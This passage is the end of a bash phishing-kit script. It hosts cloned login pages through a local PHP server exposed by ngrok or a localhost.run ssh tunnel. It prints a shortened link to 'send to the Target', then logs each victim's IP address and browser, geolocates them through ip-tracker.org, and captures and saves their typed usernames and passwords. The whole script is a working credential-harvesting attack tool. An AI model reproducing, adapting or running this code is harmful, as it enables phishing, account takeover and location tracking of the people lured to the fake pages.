    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
    cat webpages/$server/usernames.txt >> webpages/$server/saved.usernames.txt
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m webpages/%s/saved.usernames.txt\e[0m\n" $server
    killall -2 php > /dev/null 2>&1
    killall -2 ngrok > /dev/null 2>&1
    killall ssh > /dev/null 2>&1
    if [[ -e sendlink ]]; then
        rm -rf sendlink
    fi
    exit 1
}

getcredentials() {
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
    while [ true ]; do
    if [[ -e ".sites/$server/usernames.txt" ]]; then
        printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
        catch_cred
    fi
        sleep 1
    done
}

catch_ip() {
    touch webpages/$server/saved.usernames.txt
    ip=$(grep -a 'IP:' webpages/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    ua=$(grep 'User-Agent:' webpages/$server/ip.txt | cut -d '"' -f2)
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
    cat webpages/$server/ip.txt >> webpages/$server/saved.ip.txt
    if [[ -e iptracker.log ]]; then
        rm -rf iptracker.log
    fi

    IFS='\n'
    iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
    IFS=$'\n'
    continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
    printf "\n"
    hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
    if [[ $hostnameip != "" ]]; then
        printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
    fi
        reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
            if [[ $reverse_dns != "" ]]; then
                printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
            fi
                if [[ $continent != "" ]]; then
                    printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
                fi
                    country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
                    if [[ $country != "" ]]; then
                        printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
                    fi
                        state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
                        if [[ $state != "" ]]; then
                            printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
                        fi
                            city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
                            if [[ $city != "" ]]; then
                                printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
                            fi
                                isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
                                    if [[ $isp != "" ]]; then
                                        printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
                                    fi
                                    as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
                                    if [[ $as_number != "" ]]; then
                                        printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
                                    fi
                                    ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
                                    if [[ $ip_speed != "" ]]; then
                                        printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
                                    fi
                                        ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
                                        if [[ $ip_currency != "" ]]; then
                                            printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
                                        fi
                                            printf "\n"
                                            rm -rf iptracker.log
                                            getcredentials
}
start1() {
    if [[ -e sendlink ]]; then
        rm -rf sendlink
    fi
        printf "\n"
        printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
        printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Localhost Run\e[0m\n"
        printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Localhost\e[0m\n"
        default_option_server="1"
        read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m\en' option_server
        option_server="${option_server:-${default_option_server}}"
        if [[ $option_server == 1 || $option_server == 01 ]]; then
            start
            elif [[ $option_server == 2 || $option_server == 02 ]]; then
                start_local
                elif [[ $option_server == 3 || $option_server == 03 ]]; then
                start_l
                    else
                        printf "\n\n  ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}${boldYellow} Invalid option ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}\n"
                        sleep 1
                        clear
                        start1
                        fi
}
start_l() {
def_port="5555"
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
read port
port="${port:-${def_port}}"
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
cd webpages/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at :\e[0m\e[1;93m http://localhost:$port\e[0m\n"
printf "\n"
checkfound
}
start_local(){
def_port="5555"
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
read port
port="${port:-${def_port}}"
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
cd webpages/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalHostRun ..\e[0m\n"
printf "\n"
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Ctrl + C to view Login Info.Press it After the Victim Opened It.\e[0m\n"
printf "\e[1;93m\n"
ssh -R 80:localhost:$port ssh.localhost.run 2>&1
printf "\e[0m\n"
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Login Info..\e[0m\n"
while [ true ]; do
if [[ -e "webpages/$server/ip.txt" ]]; then
c_ip
rm -rf webpages/$server/ip.txt
fi
sleep 0.75
if [[ -e ".sites/$server/usernames.txt" ]]; then
account=$(grep -o 'Username:.*' webpages/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' webpages/$server/usernames.txt | cut -d ":" -f2)
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
cat webpages/$server/usernames.txt >> webpages/$server/login_info.txt
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m sites/%s/login_info.txt\e[0m\n" $server
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Press Ctrl + C to exit.\e[0m\n"
rm -rf webpages/$server/usernames.txt
fi
sleep 0.75
done
}


startx() {
    if [[ -e webpages/$server/ip.txt ]]; then
        rm -rf webpages/$server/ip.txt
    fi
        if [[ -e webpages/$server/usernames.txt ]]; then
            rm -rf webpages/$server/usernames.txt
        fi
            default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
            printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
            read port
            port="${port:-${default_port}}"
            serverx
}


##

start() {
    if [[ -e webpages/$server/ip.txt ]]; then
        rm -rf webpages/$server/ip.txt
    fi
        if [[ -e webpages/$server/usernames.txt ]]; then
            rm -rf webpages/$server/usernames.txt
        fi
            printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
            cd webpages/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
            sleep 2
            printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
            ./ngrok http 3333 > /dev/null 2>&1 &
            sleep 4
            
# Don't mess with the regex, bitchy boring thing to do

            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
            printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $link
            send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=$link" | head -n1)
# send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
            printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
            printf "\n"
            checkfound
}


checkfound() {
    printf "\n"
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ctrl + c to exit...\e[0m\n"
    while [ true ]; do
        if [[ -e "webpages/$server/ip.txt" ]]; then
            printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
            catch_ip
            rm -rf webpages/$server/ip.txt
        fi
            sleep 0.5
            if [[ -e "webpages/$server/usernames.txt" ]]; then
                printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
                catch_cred
                rm -rf webpages/$server/usernames.txt
                fi
                if [[ -e "webpages/$server/saved.ip.txt" ]]; then
                    printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
                    catch_ip
                    rm -rf webpages/$server/saved.ip.txt
                fi
                    sleep 0.5
                    if [[ -e "webpages/$server/saved.usernames.txt" ]]; then
                        printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
                        catch_cred
                        rm -rf webpages/$server/saved.usernames.txt
                    fi
                        sleep 0.5
                        done
}
banner
dependencies
menu
